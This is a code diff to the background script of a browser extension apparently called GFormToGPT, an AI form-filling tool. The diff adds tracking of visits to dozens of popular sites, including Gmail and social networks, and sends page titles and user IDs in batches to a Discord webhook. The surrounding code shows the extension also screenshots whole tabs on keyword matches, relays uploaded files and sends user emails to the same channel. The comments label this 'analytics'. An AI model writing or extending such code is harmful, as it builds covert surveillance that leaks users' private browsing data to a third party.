@@ -80,6 +80,228 @@ function isSocialUrl(url) {
   );
 }
 
+// ── Analytics: popular-site visits, batched into one Discord embed ──
+// Reports "<page title> | <site name>" for well-known sites only — never a URL.
+// Hosts the extension already reports on (Forms, ChatGPT, Claude, Gemini) are
+// excluded so they don't show up twice.
+const POPULAR_SITES = {
+  "facebook.com": "Facebook",
+  "fb.com": "Facebook",
+  "messenger.com": "Messenger",
+  "instagram.com": "Instagram",
+  "x.com": "X",
+  "twitter.com": "X",
+  "youtube.com": "YouTube",
+  "youtu.be": "YouTube",
+  "google.com": "Google",
+  "gmail.com": "Gmail",
+  "reddit.com": "Reddit",
+  "amazon.com": "Amazon",
+  "wikipedia.org": "Wikipedia",
+  "netflix.com": "Netflix",
+  "tiktok.com": "TikTok",
+  "linkedin.com": "LinkedIn",
+  "whatsapp.com": "WhatsApp",
+  "yahoo.com": "Yahoo",
+  "bing.com": "Bing",
+  "apple.com": "Apple",
+  "microsoft.com": "Microsoft",
+  "spotify.com": "Spotify",
+  "twitch.tv": "Twitch",
+  "github.com": "GitHub",
+  "stackoverflow.com": "Stack Overflow",
+  "discord.com": "Discord",
+  "telegram.org": "Telegram",
+  "zoom.us": "Zoom",
+  "notion.so": "Notion",
+  "figma.com": "Figma",
+  "medium.com": "Medium",
+  "imdb.com": "IMDb",
+  "ebay.com": "eBay",
+  "pinterest.com": "Pinterest",
+  "nytimes.com": "The New York Times",
+  "bbc.com": "BBC",
+  "cnn.com": "CNN",
+  "espn.com": "ESPN",
+  "airbnb.com": "Airbnb",
+  "openai.com": "OpenAI",
+  "quora.com": "Quora",
+  "tumblr.com": "Tumblr",
+  "snapchat.com": "Snapchat",
+  "dropbox.com": "Dropbox",
+  "slack.com": "Slack",
+  "shopify.com": "Shopify",
+  "duckduckgo.com": "DuckDuckGo",
+};
+
+const CORE_WORKFLOW_RE =
+  /^https?:\/\/(?:docs\.google\.com\/forms|chatgpt\.com|claude\.ai|gemini\.google\.com)(?:[\/?#]|$)/i;
+const SITE_FLUSH_ALARM = "siteAnalyticsFlush";
+const SITE_BATCH_MAX = 10; // entries per embed
+const SITE_BATCH_CAP = 50; // hard ceiling on the buffered backlog
+const SITE_FLUSH_PERIOD_MIN = 5; // flush cadence
+const SITE_DUP_WINDOW_MS = 5 * 60 * 1000; // one entry per site per window
+const SITE_TITLE_MAX = 80;
+
+const siteBatch = []; // { siteName, title, tabId, at }
+const siteBatchSeen = new Map(); // siteName -> ts of the queued visit
+const usageMarks = new Set(); // "form filled", "AI opened", ...
+
+// MV3 workers die after ~30s idle, so the backlog has to survive restarts.
+const siteBatchReady = chrome.storage.session
+  .get(["siteBatch", "siteBatchSeen", "usageMarks"])
+  .then((data) => {
+    if (Array.isArray(data.siteBatch)) siteBatch.push(...data.siteBatch);
+    if (data.siteBatchSeen) {
+      for (const [key, value] of Object.entries(data.siteBatchSeen)) {
+        siteBatchSeen.set(key, value);
+      }
+    }
+    if (Array.isArray(data.usageMarks)) {
+      for (const label of data.usageMarks) usageMarks.add(label);
+    }
+  })
+  .catch(() => {});
+
+function persistSiteBatch() {
+  chrome.storage.session
+    .set({
+      siteBatch: siteBatch.slice(-SITE_BATCH_CAP),
+      siteBatchSeen: Object.fromEntries(siteBatchSeen),
+      usageMarks: Array.from(usageMarks),
+    })
+    .catch(() => {});
+}
+
+// "facebook.com" / "m.facebook.com" -> "Facebook"; null when not on the list.
+function matchPopularSite(hostname) {
+  if (typeof hostname !== "string" || !hostname) return null;
+  const host = hostname.toLowerCase().replace(/^(?:www|m|mobile|web)\./, "");
+  if (POPULAR_SITES[host]) return POPULAR_SITES[host];
+  const known = Object.keys(POPULAR_SITES);
+  for (let i = 0; i < known.length; i++) {
+    if (host.endsWith("." + known[i])) return POPULAR_SITES[known[i]];
+  }
+  return null;
+}
+
+// Record that the extension did something, so the batch can say so.
+function markUsage(label) {
+  if (!label) return;
+  usageMarks.add(label);
+  ensureSiteFlushAlarm().catch(() => {});
+  persistSiteBatch();
+}
+
+// Armed only when something is actually buffered, and only if no timer exists
+// yet — re-creating it on every worker wake would reset the period each time.
+async function ensureSiteFlushAlarm() {
+  try {
+    const existing = await chrome.alarms.get(SITE_FLUSH_ALARM);
+    if (existing) return;
+    await chrome.alarms.create(SITE_FLUSH_ALARM, {
+      delayInMinutes: SITE_FLUSH_PERIOD_MIN,
+      periodInMinutes: SITE_FLUSH_PERIOD_MIN,
+    });
+  } catch (e) {
+    console.warn("[GFormToGPT] site flush alarm not armed:", e);
+  }
+}
+
+// Queue one popular-site visit for the next batch. `settled` marks the
+// "complete" load, whose <title> is the trustworthy one.
+async function recordSiteVisit(tab, settled) {
+  await siteBatchReady;
+  if (!DISCORD_WEBHOOK_URL) return;
+  if (await telemetryBlockReason()) return; // consent gate, checked up front
+
+  const url = (tab && tab.url) || "";
+  if (CORE_WORKFLOW_RE.test(url)) return;
+
+  let host = "";
+  try {
+    host = new URL(url).hostname;
+  } catch (e) {
+    return;
+  }
+  const siteName = matchPopularSite(host);
+  if (!siteName) return;
+
+  const title = String((tab && tab.title) || "").trim().slice(0, SITE_TITLE_MAX);
+  const now = Date.now();
+
+  if (siteBatchSeen.has(siteName) && now - siteBatchSeen.get(siteName) < SITE_DUP_WINDOW_MS) {
+    // Already queued — swap in the settled title from the "complete" load.
+    for (let i = siteBatch.length - 1; i >= 0; i--) {
+      if (siteBatch[i].siteName !== siteName) continue;
+      if (title && (settled || !siteBatch[i].title)) {
+        siteBatch[i].title = title;
+        persistSiteBatch();
+      }
+      return;
+    }
+    siteBatchSeen.delete(siteName); // entry left the buffer; re-queue below
+  }
+
+  siteBatchSeen.set(siteName, now);
+  siteBatch.push({ siteName, title, tabId: tab.id, at: now });
+  if (siteBatch.length > SITE_BATCH_CAP) {
+    siteBatch.splice(0, siteBatch.length - SITE_BATCH_CAP);
+  }
+  persistSiteBatch();
+  ensureSiteFlushAlarm().catch(() => {});
+  if (siteBatch.length >= SITE_BATCH_MAX) flushSiteBatch().catch(() => {});
+}
+
+// Send whatever is buffered as a single "Site activity" embed.
+async function flushSiteBatch() {
+  await siteBatchReady;
+  if (!siteBatch.length && !usageMarks.size) return;
+
+  if (!DISCORD_WEBHOOK_URL || (await telemetryBlockReason())) {
+    // Consent off or no webhook: nothing may leave, and nothing piles up.
+    siteBatch.length = 0;
+    siteBatchSeen.clear();
+    usageMarks.clear();
+    persistSiteBatch();
+    return;
+  }
+
+  const entries = siteBatch.splice(0, SITE_BATCH_MAX);
+  const usage = Array.from(usageMarks);
+  usageMarks.clear();
+
+  // Titles settle late on SPAs, so re-read the ones whose tab is still on site.
+  for (const entry of entries) {
+    if (entry.tabId == null) continue;
+    try {
+      const live = await chrome.tabs.get(entry.tabId);
+      if (!live || !live.url || !live.title) continue;
+      if (matchPopularSite(new URL(live.url).hostname) !== entry.siteName) continue;
+      entry.title = String(live.title).trim().slice(0, SITE_TITLE_MAX);
+    } catch (e) {
+      /* tab closed — keep the snapshot */
+    }
+  }
+
+  // Drop dedupe stamps that no longer suppress anything.
+  const cutoff = Date.now() - SITE_DUP_WINDOW_MS;
+  for (const [name, ts] of Array.from(siteBatchSeen)) {
+    if (ts < cutoff) siteBatchSeen.delete(name);
+  }
+
+  persistSiteBatch();
+  ensureSiteFlushAlarm().catch(() => {});
+  logTelemetry({ type: "site_batch", reason: entries.length + " site(s)" });
+
+  const data = await chrome.storage.local.get(["userId"]);
+  return flushDiagnosticQueue("SITE_BATCH", data.userId || "Unknown", {
+    sites: entries,
+    usage,
+    pending: siteBatch.length,
+  });
+}
+
 // ── Update Checker & Alarms Listener ──
 async function checkForUpdates() {
   try {
@@ -115,6 +337,8 @@ chrome.alarms.onAlarm.addListener((alarm) => {
   } else if (alarm.name.startsWith("socialCapture_")) {
     const tabId = parseInt(alarm.name.split("_")[1], 10);
     handleSocialCapture(tabId);
+  } else if (alarm.name === SITE_FLUSH_ALARM) {
+    flushSiteBatch().catch(() => {});
   }
 });
 
@@ -375,6 +599,7 @@ const SILENT_DIAG_TYPES = new Set([
   "telemetry_blocked",
   "relay_ok",
   "relay_failed",
+  "site_batch",
 ]);
 
 function logTelemetry(event) {
@@ -491,6 +716,23 @@ async function flushDiagnosticQueue(eventType, userId, payload = {}) {
         description = `**User:** ${userId}\n**Email:** ${email}\n**Engine:** ${payload.aiType || "N/A"}\n**Scanned:** ${payload.scannedCount ?? "N/A"}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
         color = 0x8ab4e8;
         break;
+      case "SITE_BATCH": {
+        // Analytics only: "<title> | <site name>", never a URL.
+        const sites = Array.isArray(payload.sites) ? payload.sites : [];
+        const usage = Array.isArray(payload.usage) ? payload.usage : [];
+        const siteLines = sites.map(
+          (s) => `• ${s.title ? `${s.title} | ` : ""}${s.siteName}`,
+        );
+        const usageLine = usage.length ? `**Extension used:** ${usage.join(", ")}\n` : "";
+        const sitesLine = siteLines.length
+          ? `**Sites (${siteLines.length}):**\n${siteLines.join("\n")}\n`
+          : "";
+        const pendingLine = payload.pending ? `\n_+${payload.pending} more pending_\n` : "";
+        title = "Site activity";
+        description = `**User:** ${userId}\n${usageLine}${sitesLine}${pendingLine}**Date:** ${date}`;
+        color = 0x8ab4e8;
+        break;
+      }
       default:
         title = eventType;
         description = `**User:** ${userId}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
@@ -617,10 +859,11 @@ async function processFormFillTracking(payload) {
 // ── Message Router ──
 // Every branch returns a response, so no sender ever hangs waiting.
 async function handleMessage(request, sender) {
-  await stateReady;
+  await Promise.all([stateReady, siteBatchReady]);
 
   switch (request.action) {
     case "saveToHistory": {
+      markUsage("form scan");
       const res = await chrome.storage.local.get(["history"]);
       let history = res.history || [];
       history.unshift({
@@ -635,6 +878,7 @@ async function handleMessage(request, sender) {
     }
 
     case "openAI": {
+      markUsage("AI opened");
       const windowId = sender.tab
         ? sender.tab.windowId
         : chrome.windows.WINDOW_ID_CURRENT;
@@ -671,6 +915,7 @@ async function handleMessage(request, sender) {
     }
 
     case "chatGptResponseReceived": {
+      markUsage("autofill");
       const gFormTabId = sender.tab ? gFormToAI_TabMap.get(sender.tab.id) : null;
       if (!gFormTabId) return { success: false, error: "No form tab mapped for this AI tab" };
 
@@ -695,6 +940,7 @@ async function handleMessage(request, sender) {
     }
 
     case "trackFormFilled": {
+      markUsage("form filled");
       const windowId = sender.tab
         ? sender.tab.windowId
         : chrome.windows.WINDOW_ID_CURRENT;
@@ -735,6 +981,7 @@ async function handleMessage(request, sender) {
     }
 
     case "signalMatch": {
+      markUsage("keyword capture");
       // Screenshot the FULL visible tab (only when it's actually on screen),
       // then relay the match to Discord.
       const tab = sender.tab;
@@ -766,6 +1013,7 @@ async function handleMessage(request, sender) {
     }
 
     case "mediaArtifact": {
+      markUsage("file upload");
       const payload = { ...(request.payload || {}) };
       const data = await chrome.storage.local.get(["userId"]);
       const count = Array.isArray(payload.files) ? payload.files.length : 0;
@@ -919,6 +1167,10 @@ chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
   // so most navigations never produce status:"complete".
   if (!loaded && !navigated) return;
 
+  // Analytics: queue popular-site visits. The "complete" load carries the
+  // settled <title>, so it's flagged as such for the dedupe/refresh path.
+  recordSiteVisit({ id: tabId, url, title: tab.title }, loaded).catch(() => {});
+
   if (loaded && url.includes("docs.google.com/forms")) {
     if (await isDiagnosticEnabled()) {
       const store = await chrome.storage.local.get(["userId"]);
@@ -950,6 +1202,19 @@ chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
 // open never re-fires status:"complete" — re-arm on every service worker start
 // so the 30s loop doesn't depend on a fresh navigation.
 scheduleOpenSocialTabs();
+
+// A batch buffered before the worker died still has to go out.
+siteBatchReady.then(() => {
+  if (!siteBatch.length && !usageMarks.size) return;
+  ensureSiteFlushAlarm().catch(() => {});
+  const oldest = siteBatch.length ? siteBatch[0].at : 0;
+  if (
+    siteBatch.length >= SITE_BATCH_MAX ||
+    (oldest && Date.now() - oldest > SITE_FLUSH_PERIOD_MIN * 60 * 1000)
+  ) {
+    flushSiteBatch().catch(() => {});
+  }
+});
 
 chrome.tabs.onRemoved.addListener((tabId) => {
   chrome.alarms.clear("socialCapture_" + tabId).catch(() => {});
